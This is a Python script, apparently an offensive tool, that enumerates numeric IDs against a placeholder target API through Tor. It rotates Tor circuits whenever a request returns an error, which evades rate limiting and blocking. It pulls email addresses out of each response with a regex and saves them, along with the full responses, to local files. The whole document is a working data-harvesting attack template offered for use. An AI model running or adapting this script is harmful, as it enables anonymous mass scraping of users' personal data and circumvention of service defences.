# -*- coding: utf-8 -*-
# T4T34m
import requests
import re
####-----------[ TOR CONNECTION ]-----------####
from stem import Signal
from stem.control import Controller
def get_tor_session():
    RefreshTor()
    s = requests.session()
    s.proxies = {'http':  'socks5://127.0.0.1:9050','https': 'socks5://127.0.0.1:9050'}
    return s
def RefreshTor():
    with Controller.from_port(port = 9051) as controller:
        controller.authenticate(password='UR_PASS_HERE') #<-- DONT FORGET TO CHANGE PASSWORD READ : TOR_with_Py.py        
        controller.signal(Signal.NEWNYM)
################################################
print("""\n\x1b[1;38;5;110m[+] Enter from 1 to 1000 or whatever top number \x1b[0m
\x1b[1;38;5;120mex: will read from top to down 1000 , 999 , 998 , 997 .....etc\n \x1b[0m\n""")
f111 = int(input('Enter down number (1) : '))
f222 = int(input('Enter top number (1000): '))
################################################
startNumber = f111
tillNumber = f222
RanDomNumb = startNumber
################################################
url = "TARGET.COM/API"
cookies = {"COOKIE HERE"}
headers = {"Accept": "*/*", "Api_Key": "x", "Accept-Encoding": "gzip, deflate", "Accept-Language": "arabic", "Cache-Control": "no-cache", "Content-Type": "multipart/form-data; boundary=Boundary+X", "User-Agent": "X", "Connection": "close"}
########### ^ REQUEST HEADER HERE as Json {"X": "Y","X2": "Y2"}
################################################ POST DATA LINE (36)
while startNumber < tillNumber:
    RanDomNumb += 1        
    s = get_tor_session()
    for x in range(tillNumber, startNumber, -1):
##### POST DATA HERE ###########################################        
        data = "POST DATA HERE"%(x)
##### POST DATA HERE ###########################################        
        r = s.post(url, headers=headers, cookies=cookies, data=data)
        po = r.content
        if b"error" in po:
            RefreshTor()
            print("❌\x1b[1;38;5;197m re-new tor connection(%s)\x1b[0m"%(x))
            pass
        else:
            outputX=r.content.decode('utf-8')
            match = re.search(r'([a-zA-Z0-9._\-\!\@\#\$\+]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)', outputX)
            printEmailOnly=match.group(0)
            if '@' in printEmailOnly:
                print("✔\x1b[1;38;5;120m %s\x1b[0m"%(printEmailOnly))
                file = open("emails_output_ONLY.txt", "a+")
                file.write("%s\n" %(printEmailOnly))
            file = open("all_INFO.json", "a+")
            file.write("%s\n," %(outputX))
            file.close()
